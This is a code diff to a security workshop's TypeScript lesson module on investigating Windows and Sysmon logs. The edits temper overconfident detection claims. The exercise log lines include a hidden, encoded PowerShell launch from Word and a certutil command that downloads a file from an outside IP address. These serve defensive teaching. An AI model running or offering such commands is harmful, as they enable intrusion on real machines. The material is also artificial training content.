@@ -280,7 +280,7 @@ export const session02: Session = {
             note: {
               kind: 'observation',
               label: 'Normal interactive logon',
-              body: 'LogonType 2 is a console logon — the user physically at the machine. This is unremarkable and it matters: it establishes that a legitimate user session existed before anything else happened, which is what makes the later events a compromise of a session rather than a remote intrusion.',
+              body: 'LogonType 2 records an interactive logon. It does not prove who was physically present or that the session was legitimate. Here it establishes an account session before the later process activity; attribution remains a separate question.',
             },
           },
           {
@@ -288,7 +288,7 @@ export const session02: Session = {
             note: {
               kind: 'attack',
               label: 'The parent-child relationship is the finding',
-              body: 'Sysmon Event ID 1 records process creation with the parent. A spreadsheet application spawning a PowerShell interpreter has no legitimate explanation in a finance workstation. This single relationship is more diagnostic than the encoded command itself — it maps to T1059.001 and tells you the document was weaponised.',
+              body: 'Sysmon Event ID 1 records process creation with the parent. A spreadsheet spawning PowerShell is a high-value lead, but legitimate automation can produce it. Check the command, user, baseline and follow-on activity before attributing malicious intent. PowerShell execution maps to T1059.001; the mapping alone does not establish compromise.',
             },
           },
           {
@@ -303,8 +303,8 @@ export const session02: Session = {
             text: '02:14:41  Sysmon:3  powershell.exe → 185.220.101.45:443  (outbound, established)',
             note: {
               kind: 'confirmed',
-              label: 'Second independent source corroborates the first',
-              body: 'Event ID 3 attributes a network connection to a process. The decoded command said it would connect; the network event says it did. Two independent event types agreeing is what upgrades this from decoded intent to confirmed action. Note the port — 443 blends with ordinary HTTPS traffic and tells you nothing by itself.',
+              label: 'Network evidence corroborates decoded intent',
+              body: 'Event ID 3 attributes a network connection to a process. The decoded command said it would connect; the network event says it did. The connection event supports an observed action beyond decoded intent. Both events come from the same host and collector, so do not call them fully independent sources. Note the port — 443 blends with ordinary HTTPS traffic and tells you nothing by itself.',
             },
           },
           {
@@ -312,7 +312,7 @@ export const session02: Session = {
             note: {
               kind: 'confirmed',
               label: 'The payload landed',
-              body: 'Two tells in one line. C:\\Users\\Public is world-writable and no legitimate installer targets it. The filename imitates svchost.exe, a real Windows process — but the real one lives in System32 and there is no svchost32.exe in Windows. Name-mimicry plus wrong-path is a reliable masquerading signature (T1036).',
+              body: 'Two tells in one line. C:\\Users\\Public is world-writable and an unexpected executable there needs investigation. The filename imitates svchost.exe, a real Windows process — but the real one lives in System32 and there is no svchost32.exe in Windows. Name-mimicry plus wrong-path is a reliable masquerading signature (T1036).',
             },
           },
           {
@@ -320,7 +320,7 @@ export const session02: Session = {
             note: {
               kind: 'confirmed',
               label: 'Persistence — this is why reimaging matters',
-              body: 'Event ID 4698. The task runs the dropped binary, so the compromise now survives reboots, and surviving reboots is what separates an incident from an inconvenience. Note the name does the same imitation trick as the binary. T1053.005.',
+              body: 'Event ID 4698. The task references the dropped binary and creates a persistence opportunity. Check its trigger, enabled state and execution records before claiming it ran or survived a reboot. Note the name does the same imitation trick as the binary. T1053.005.',
             },
           },
           {
@@ -336,7 +336,7 @@ export const session02: Session = {
           'Excel spawned PowerShell with an encoded command at 02:14:33 on FINANCE-PC-04',
           'The decoded command instructed a download from 185.220.101.45, and a connection to that address was established eight seconds later',
           'An executable was written to C:\\Users\\Public and a scheduled task was created to run it',
-          'The compromise has a persistence mechanism and therefore survives a reboot',
+          'A scheduled task references the executable as a persistence mechanism; inspect its trigger and execution evidence before claiming it survived reboot',
         ],
         doesNotProve: [
           'That credentials were dumped — the privilege was granted, not demonstrably used',
@@ -375,7 +375,7 @@ export const session02: Session = {
             { id: 'l02', text: '09:03:44  explorer.exe → chrome.exe', malicious: false, why: 'Browser launched from the desktop shell. Ordinary.' },
             { id: 'l03', text: '09:06:18  services.exe → MsMpEng.exe', malicious: false, why: 'Windows Defender\'s engine, started by the service control manager. Exactly the right parent.' },
             { id: 'l04', text: '09:08:51  OUTLOOK.EXE → WINWORD.EXE', malicious: false, why: 'A user opened a document attachment. Suspicious as a route, entirely normal as an event — and on its own it is not evidence of anything.' },
-            { id: 'l05', text: '09:09:03  WINWORD.EXE → cmd.exe /c powershell -w hidden -enc JABwAD0A...', malicious: true, why: 'A word processor spawning a command interpreter has no legitimate explanation. Add -w hidden, which suppresses the window from the user, and an encoded command. This is the start of the chain. T1059.001.' },
+            { id: 'l05', text: '09:09:03  WINWORD.EXE → cmd.exe /c powershell -w hidden -enc JABwAD0A...', malicious: true, why: 'A word processor spawning a command interpreter is unusual and needs context. Add -w hidden, which suppresses the window from the user, and an encoded command. This is the start of the chain. T1059.001.' },
             { id: 'l06', text: '09:09:04  cmd.exe → powershell.exe -w hidden -enc JABwAD0A...', malicious: true, why: 'The second link. cmd.exe is acting purely as a launcher for PowerShell, which is what the macro\'s shell call produces.' },
             { id: 'l07', text: '09:09:11  chrome.exe → chrome.exe (renderer)', malicious: false, why: 'Chrome spawns its own sandboxed child processes constantly. High volume, no signal.' },
             { id: 'l08', text: '09:09:29  powershell.exe → certutil.exe -urlcache -split -f http://185.220.101.45/a.txt', malicious: true, why: 'A LOLBin used for its abuse case. certutil is a certificate utility; -urlcache -f makes it a downloader. The binary is signed by Microsoft and the argument is the entire finding. T1105.' },
@@ -427,7 +427,7 @@ export const session02: Session = {
           { part: '| sort _time', explains: 'Chronological order, so a chain across several events reads as a sequence rather than a set.' },
         ],
         expected:
-          'In a healthy environment, near zero results over weeks. Office applications do not legitimately spawn interpreters. A result here is a finding, not a starting point — which is exactly the property that makes this rule worth having.',
+          'In a healthy environment, near zero results over weeks. Some legitimate Office automation can spawn interpreters. Validate each result against the baseline and corroborating activity — which is exactly the property that makes this rule worth having.',
         limitations: [
           'It will not fire without Sysmon deployed and forwarded. The rule looks healthy and returns nothing either way.',
           'It only names three Office binaries. OUTLOOK.EXE, MSACCESS.EXE and VISIO.EXE are equally capable parents and are not covered.',
@@ -517,7 +517,7 @@ export const session02: Session = {
                 text: 'WINWORD.EXE spawning powershell.exe',
                 correct: true,
                 feedback:
-                  'Correct. This parent-child relationship essentially does not occur in legitimate use, which makes it unusually precise. The source material calls these relationships "essentially free of noise".',
+                  'Correct. This is the strongest lead among the choices, but it still needs context: legitimate Office automation can spawn interpreters. Confirm the command, baseline and follow-on activity.',
               },
               {
                 text: 'powershell.exe running with an encoded command',
@@ -578,7 +578,7 @@ export const session02: Session = {
         sources: [{ file: FILE, section: '12. Actionable Takeaways' }],
         takeaways: [
           'Enable what Windows does not log by default — 4688 with command lines, Script Block Logging, Sysmon — before you need it. It cannot be applied to the past.',
-          'The parent-child relationship is among the most precise detection signals available, because it is almost noise-free.',
+          'Parent-child relationships are valuable detection signals when assessed against the host baseline, arguments and follow-on activity.',
           'Detect LOLBins by argument, never by binary name.',
           'Every false positive must be documented and fed back, without exception.',
           'Corroboration across independent sources is what turns a suspicion into a finding.',
@@ -680,7 +680,7 @@ export const session02: Session = {
             title: 'Map, classify and state your uncertainty',
             steps: [
               'Map every confirmed step to an ATT&CK technique, with the identifier.',
-              'Label each timeline row: observation, hypothesis, or confirmed. A row is only confirmed if two independent sources support it.',
+              'Label each timeline row: observation, hypothesis, or confirmed. For this workshop, reserve the confirmed label for findings with two supporting sources; state when they share a collector or trust boundary.',
               'Write down three things you cannot determine from logs alone.',
               'For each, name the specific evidence source that would resolve it — memory image, disk image, EDR telemetry, full packet capture.',
             ],
@@ -724,7 +724,7 @@ export const session02: Session = {
           {
             forTask: 'T4',
             tiers: [
-              'For the confirmed label, ask: which second, independent source says the same thing? If you cannot name one, the row is a hypothesis.',
+              'For a confirmed interpretation, name the supporting evidence. Distinguish a directly observed event from your explanation of it, and state if both records depend on the same collector.',
               'Good open questions are about what logs structurally cannot record: process memory contents, whether a credential was actually used, what was inside the encrypted payload.',
               'If you are stuck, consider the privilege grant. The log shows privileges assigned. What evidence source would show whether they were exercised?',
             ],
@@ -776,7 +776,7 @@ export const session02: Session = {
             band: 'Evidence discipline',
             weight: '25%',
             descriptor:
-              'Observations, hypotheses and confirmed findings are labelled distinctly. Nothing is marked confirmed on a single source. The report claims no more than the evidence supports.',
+              'Observations, hypotheses and confirmed findings are labelled distinctly. Confirmed interpretations have supporting evidence and state any shared-source limits. The report claims no more than the evidence supports.',
           },
           {
             band: 'Signal separation',
